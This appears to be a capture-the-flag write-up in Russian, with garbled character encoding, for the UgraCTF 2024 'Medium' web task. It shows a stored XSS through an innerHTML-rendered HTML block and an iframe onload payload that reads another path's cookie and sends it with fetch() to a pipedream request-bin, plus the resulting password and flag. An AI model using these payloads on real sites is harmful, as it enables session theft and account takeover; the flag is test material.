# Medium: Write-up

–ó–∞—Ö–æ–¥–∏–º –Ω–∞ —Å–∞–π—Ç –∏ –≤–∏–¥–∏–º –æ–¥–Ω—É —Å—Ç–∞—Ç—å—é —Å —Ä–∞–∑–±–æ—Ä–æ–º –∑–∞–¥–∞–Ω–∏—è **Secure Vault**. –†–∞–∑–±–æ—Ä –≤—ã–≥–ª—è–¥–∏—Ç –∫–∞–∫ —á—Ç–æ-—Ç–æ, –Ω–∞–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ ChatGPT:

![–†–∞–∑–±–æ—Ä](writeup/writeup-top.png)

–í —É—Å–ª–æ–≤–∏–∏ –∑–∞–¥–∞–Ω–∏—è Medium —Å–∫–∞–∑–∞–Ω–æ, —á—Ç–æ –µ–≥–æ —Ñ–ª–∞–≥ —É–∂–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è —Ä–∞–Ω–µ–µ; –ø–æ-–≤–∏–¥–∏–º–æ–º—É, –Ω—É–∂–Ω–æ –ø—Ä–æ—Å—Ç–æ –∑–∞—Å–ª–∞—Ç—å —Ñ–ª–∞–≥ –æ—Ç Secure Vault.

–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ —Å–ª–æ–∂–Ω–æ, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤ –∫–∞–∫–æ–π-—Ç–æ –º–æ–º–µ–Ω—Ç —Ä–∞–∑–±–æ—Ä –æ–±—Ä—ã–≤–∞–µ—Ç—Å—è —Ç–∞–∫:

![üîí –ü—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ —Å—Ç–∞—Ç—å–∏ –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –ø–æ –ø–ª–∞—Ç–Ω–æ–π –ø–æ–¥–ø–∏—Å–∫–µ. –°–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–≤—Ç–æ—Ä–æ–º –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞.](writeup/locked.png)

–ü–æ–ª—É—á–∞–µ—Ç—Å—è, –Ω—É–∂–Ω–æ –∫–∞–∫-—Ç–æ –æ–±–æ–π—Ç–∏ –ø—Ä–æ–≤–µ—Ä–∫—É –Ω–∞ –ø–æ–¥–ø–∏—Å–∫—É.

–ß—Ç–æ–±—ã –ø–æ–Ω—è—Ç—å, –∫–∞–∫ —ç—Ç–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞, —Å–æ–∑–¥–∞–¥–∏–º —Å–≤–æ—é —Å—Ç–∞—Ç—å—é —Å –ø–ª–∞—Ç–Ω–æ–π –ø–æ–¥–ø–∏—Å–∫–æ–π.

![–°—Ç–∞—Ç—å—è](writeup/article-owner.png)

–°–Ω–∏–∑—É —Å–ø—Ä–∞–≤–∞ –µ—Å—Ç—å –¥–≤–µ –∫–Ω–æ–ø–∫–∏, –≥–µ–Ω–µ—Ä–∏—Ä—É—é—â–∏–µ:

- –ü—É–±–ª–∏—á–Ω—É—é —Å—Å—ã–ª–∫—É: https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/mkk4e2kAK9NiguilVSG3gw/
- –ü—Ä–∏–≤–∞—Ç–Ω—É—é —Å—Å—ã–ª–∫—É: https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/mkk4e2kAK9NiguilVSG3gw/?password=olBIamGoMJoDTyQFkTSyHg

–ü—É–±–ª–∏—á–Ω–∞—è —Å—Å—ã–ª–∫–∞ –≤ —Ç–æ—á–Ω–æ—Å—Ç–∏ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å —Ç–æ–π, –ø–æ –∫–æ—Ç–æ—Ä–æ–π –º—ã —Å–æ–∑–¥–∞–µ–º –∏–ª–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º —Å—Ç–∞—Ç—å—é. –ü—Ä–∏ —ç—Ç–æ–º —Å–∞–π—Ç –¥–æ–ª–∂–µ–Ω –∫–∞–∫-—Ç–æ –ø–æ–Ω–∏–º–∞—Ç—å, –∫—Ç–æ –µ–≥–æ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç, –ø–æ—Ç–æ–º—É —á—Ç–æ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —ç—Ç–æ–π —Å—Å—ã–ª–∫–∏ –≤ —Ä–µ–∂–∏–º–µ –∏–Ω–∫–æ–≥–Ω–∏—Ç–æ –ø–æ–ª—É—á–∞–µ–º —Å–ª–µ–¥—É—é—â–µ–µ:

![–°—Ç–∞—Ç—å—è](writeup/article-public.png)

–ü–æ–∏—â–µ–º –∫—É–∫–∏:

![Cookies](writeup/cookie.png)

–ï—Å–ª–∏ —Å–æ–∑–¥–∞—Ç—å –µ—â–µ –æ–¥–Ω—É —Å—Ç–∞—Ç—å—é, —Å–µ—Ä–≤–µ—Ä —Å–æ–∑–¥–∞—Å—Ç –µ—â–µ –æ–¥–Ω—É –∫—É–∫—É `password` —Å –¥—Ä—É–≥–∏–º –∑–Ω–∞—á–µ–Ω–∏–µ–º –∏ –¥—Ä—É–≥–∏–º –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º `path`. –ü–æ–ª—É—á–∞–µ—Ç—Å—è, —É –∫–∞–∂–¥–æ–π —Å—Ç–∞—Ç—å–∏ –µ—Å—Ç—å —Å–≤–æ–π –ø–∞—Ä–æ–ª—å, –ø–æ–∑–≤–æ–ª—è—é—â–∏–π –µ–µ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å, –∏ —Å–µ—Ä–≤–µ—Ä —Å—Ä–∞–≤–Ω–∏–≤–∞–µ—Ç —Å –Ω–∏–º –ø–µ—Ä–µ–¥–∞–Ω–Ω—É—é –∫—É–∫—É `password`. –ü–æ—Å–∫–æ–ª—å–∫—É —É –∫–∞–∂–¥–æ–π –∫—É–∫–∏ `password` —Å–≤–æ–π –ø–∞—Ä–∞–º–µ—Ç—Ä `path`, –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Ç–∞—Ç—å–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø–∞—Ä–æ–ª—å –∫ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ.

–ü–∞—Ä–æ–ª—å –≤ –∫—É–∫–∞—Ö –Ω–µ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å –ø–∞—Ä–æ–ª–µ–º –≤ –ø—Ä–∏–≤–∞—Ç–Ω–æ–π —Å—Å—ã–ª–∫–µ. –î–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ, –µ—Å–ª–∏ –æ—Ç–∫—Ä—ã—Ç—å –ø—Ä–∏–≤–∞—Ç–Ω—É—é —Å—Å—ã–ª–∫—É –≤ —Ä–µ–∂–∏–º–µ –∏–Ω–∫–æ–≥–Ω–∏—Ç–æ, —Ç–æ –ø—Ä–æ–∏–∑–æ–π–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫—É–∫–∏ –∏ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è, –∏ –º—ã —É–≤–∏–¥–∏–º —Å–ª–µ–¥—É—é—â—É—é –∫–∞—Ä—Ç–∏–Ω—É:

![–°—Ç–∞—Ç—å—è](writeup/article-private.png)

–í —É—Å–ª–æ–≤–∏–∏ —Å–∫–∞–∑–∞–Ω–æ, —á—Ç–æ –Ω–∞—Å –ø—Ä–æ—Å—è—Ç –≤—ã–ª–æ–∂–∏—Ç—å –∞–Ω–µ–∫–¥–æ—Ç—ã, –∞ –≤–ª–∞–¥–µ–ª–µ—Ü —Å–∞–π—Ç–∞, –ø–æ-–≤–∏–¥–∏–º–æ–º—É, –∏—Ö –ø—Ä–æ—á–∏—Ç–∞–µ—Ç. –ò—Ç–∞–∫, –Ω–∞—à–∞ –∑–∞–¥–∞—á–∞ ‚Äî –∫–∞–∫–∏–º-—Ç–æ –æ–±—Ä–∞–∑–æ–º –≤—ã—Ç–∞—â–∏—Ç—å –∫—É–∫—É `password` –æ—Ç —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å —Ä–∞–∑–±–æ—Ä–æ–º, –∫–æ–≥–¥–∞ –∞–≤—Ç–æ—Ä (–∏–ª–∏ –∫—Ç–æ-—Ç–æ –µ—â—ë, —É –∫–æ–≥–æ –µ—Å—Ç—å –ø—Ä–∏–≤–∞—Ç–Ω–∞—è —Å—Å—ã–ª–∫–∞ –Ω–∞ —Å—Ç–∞—Ç—å—é —Å —Ä–∞–∑–±–æ—Ä–æ–º) –∑–∞–π–¥—ë—Ç –ø–æ—á–∏—Ç–∞—Ç—å –Ω–∞—à–∏ –∞–Ω–µ–∫–¥–æ—Ç—ã.

–í –∫–æ–¥–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –≤–∏–¥–∏–º:

```javascript
class PatchedRawTool extends RawTool {
	render() {
		const wrapper = super.render();
		if (this.readOnly) {
			const div = document.createElement("div");
			div.innerHTML = this.data.html;
			wrapper.appendChild(div);
			this.textarea.hidden = true;
		} else {
			this.textarea.addEventListener("keydown", e => {
				// Make backspace work correctly
				if (e.key === "Backspace") {
					e.stopPropagation();
				}
			})
		}
		return wrapper;
	}
}
```

–ü–æ–ª—É—á–∞–µ—Ç—Å—è, –¥–ª—è –∑–∞–ø—É—Å–∫–∞ JavaScript-–∫–æ–¥–∞ –Ω–∞ —Å–≤–æ–µ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ –º–æ–∂–Ω–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–º ¬´Raw HTML¬ª –≤ —Ä–µ–¥–∞–∫—Ç–æ—Ä–µ. –ü—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –±–µ–∑ –ø—Ä–∞–≤ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è (—Ç–æ –µ—Å—Ç—å –ø–æ –ø—É–±–ª–∏—á–Ω–æ–π –∏–ª–∏ –ø—Ä–∏–≤–∞—Ç–Ω–æ–π —Å—Å—ã–ª–∫–µ) HTML –≤—Å—Ç–∞–≤–∏—Ç—Å—è —á–µ—Ä–µ–∑ —Ç–µ–≥ `innerHTML`.

–ü–æ–ø—Ä–æ–±—É–µ–º –Ω–∞–ø–∏—Å–∞—Ç—å –ø—Ä–æ—Å—Ç–µ–π—à–∏–π —ç–∫—Å–ø–ª–æ–∏—Ç:

![–≠–∫—Å–ø–ª–æ–∏—Ç](writeup/exploit1-owner.png)

–û—Ç–∫—Ä–æ–µ–º –≤ —Ä–µ–∂–∏–º–µ –∏–Ω–∫–æ–≥–Ω–∏—Ç–æ, –∏...

![–≠–∫—Å–ø–ª–æ–∏—Ç](writeup/exploit1-public.png)

–ù–∏—á–µ–≥–æ –Ω–µ –ø—Ä–æ–∏–∑–æ—à–ª–æ! –ü—Ä–∏ —ç—Ç–æ–º –≤ DevTools –≤–∏–¥–∏–º, —á—Ç–æ —Ç–µ–≥ `<script>` –≤—Å—Ç–∞–≤–∏–ª—Å—è:

![DevTools](writeup/exploit1-devtools.png)

–ü–æ—á–µ–º—É –∂–µ –∫–æ–¥ –Ω–µ –∏—Å–ø–æ–ª–Ω–∏–ª—Å—è? –û—Ç–≤–µ—Ç –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä, [–Ω–∞ StackOverflow](https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml). –°–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ç–µ–≥–æ–≤ `<script>` –Ω–µ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è, –µ—Å–ª–∏ —Ç–µ–≥ –±—ã–ª –≤—Å—Ç–∞–≤–ª–µ–Ω —á–µ—Ä–µ–∑ `innerHTML`. –í –æ—Ç–≤–µ—Ç–∞—Ö –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ —Å–ø–æ—Å–æ–± —Ç–µ–º –Ω–µ –º–µ–Ω–µ–µ –¥–æ–±–∏—Ç—å—Å—è XSS —á–µ—Ä–µ–∑ —Ç–µ–≥ `<img>`:

```html
<img src="x" onerror="alert(1);">
```

–¢–∞–∫–æ–π —ç–∫—Å–ø–ª–æ–∏—Ç —É–∂–µ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç:

![–≠–∫—Å–ø–ª–æ–∏—Ç](writeup/exploit2-owner.png)

![–≠–∫—Å–ø–ª–æ–∏—Ç](writeup/exploit2-public.png)

–¢–µ–ø–µ—Ä—å –Ω—É–∂–Ω–æ –ø—Ä–∏–¥—É–º–∞—Ç—å, –∫–∞–∫ –≤—ã—Ç–∞—â–∏—Ç—å –∫—É–∫—É —Å –¥—Ä—É–≥–∏–º –∑–Ω–∞—á–µ–Ω–∏–µ–º `path`. –û—Ç–≤–µ—Ç –Ω–∞ —ç—Ç–æ—Ç –≤–æ–ø—Ä–æ—Å —Ç–æ–∂–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è [–Ω–∞ StackOverflow](https://stackoverflow.com/questions/945862/retrieve-a-cookie-from-a-different-path). –ü—Ä–µ–¥–ª–∞–≥–∞–µ—Ç—Å—è —Å–æ–∑–¥–∞—Ç—å —Ç–µ–≥ `<iframe>` —Å `src`, —Å—Å—ã–ª–∞—é—â–∏–º—Å—è –Ω–∞ –¥—Ä—É–≥—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É. –ó–∞–æ–¥–Ω–æ –º–æ–∂–Ω–æ –∏ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–º `onload` —É `<iframe>`.

```html
<iframe src="https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/y4urwkEjcLxvz9WB/" onload="alert(this.contentDocument.cookie);">
```

–ü—Ä–∏ –ª–æ–∫–∞–ª—å–Ω–æ–º –∑–∞–ø—É—Å–∫–µ –≤–∏–¥–∏–º –ø—É—Å—Ç–æ–π `alert`, —á—Ç–æ, –≤ –æ–±—â–µ–º-—Ç–æ, —Ä–∞–∑—É–º–Ω–æ. –£ –∞–≤—Ç–æ—Ä–∞ –ø—Ä–∏ —ç—Ç–æ–º –¥–æ–ª–∂–Ω—ã –æ—Ç–æ–±—Ä–∞–∑–∏—Ç—å—Å—è –∫—É–∫–∏.

–û—Å—Ç–∞–ª–æ—Å—å –ø–æ–Ω—è—Ç—å, –∫–∞–∫ –ø–µ—Ä–µ–¥–∞—Ç—å —ç—Ç–∏ –∫—É–∫–∏ —Å–µ–±–µ. –î–ª—è —ç—Ç–æ–≥–æ –º–æ–∂–Ω–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –ª—é–±—ã–º –æ–Ω–ª–∞–π–Ω-—Å–µ—Ä–≤–∏—Å–æ–º, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–∏–Ω–∏–º–∞—Ç—å HTTP-–∑–∞–ø—Ä–æ—Å—ã –∏ –ª–æ–≥–∏—Ä–æ–≤–∞—Ç—å –∏—Ö. –ù–∞–ø—Ä–∏–º–µ—Ä, [pipedream.com](https://pipedream.com/requestbin/):

![pipedream](writeup/pipedream1.png)

–ü—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –ø–æ —Å—Å—ã–ª–∫–µ –ø—Ä–∏—Ö–æ–¥–∏—Ç —Å–æ–±—ã—Ç–∏–µ:

![pipedream](writeup/pipedream2.png)

–ù–∞—Å—Ç—Ä–æ–∏–º —ç–∫—Å–ø–ª–æ–∏—Ç —Ç–∞–∫, —á—Ç–æ–±—ã –æ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏—Å—ã–ª–∞–ª –Ω–∞ —ç—Ç—É —Å—Å—ã–ª–∫—É –∫—É–∫–∏:

```html
<iframe src="https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/y4urwkEjcLxvz9WB/" onload="fetch(`https://eohtssrnoxidmb8.m.pipedream.net/?${this.contentDocument.cookie}`);">
```

–û—Å—Ç–∞–ª–æ—Å—å –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–∞–º–∏–º –∏ –ø–æ–¥–æ–∂–¥–∞—Ç—å, –ø–æ–∫–∞ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∑–∞–π–¥—ë—Ç –∞–¥–º–∏–Ω:

![pipedream](writeup/pipedream3.png)

–£—Å—Ç–∞–Ω–æ–≤–∏–º —ç—Ç—É –∫—É–∫—É —Å–µ–±–µ, —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ —Å–∫–æ–Ω—Å—Ç—Ä—É–∏—Ä–æ–≤–∞–≤ URL: https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/y4urwkEjcLxvz9WB/?password=kLUMhULhczGL4hkx

–í–æ—Ç –∏ —Ñ–ª–∞–≥:

![–†–∞–∑–±–æ—Ä](writeup/writeup-top.png)

–§–ª–∞–≥: **ugra_secure_vault_unlocked_0mbs0t30i787**
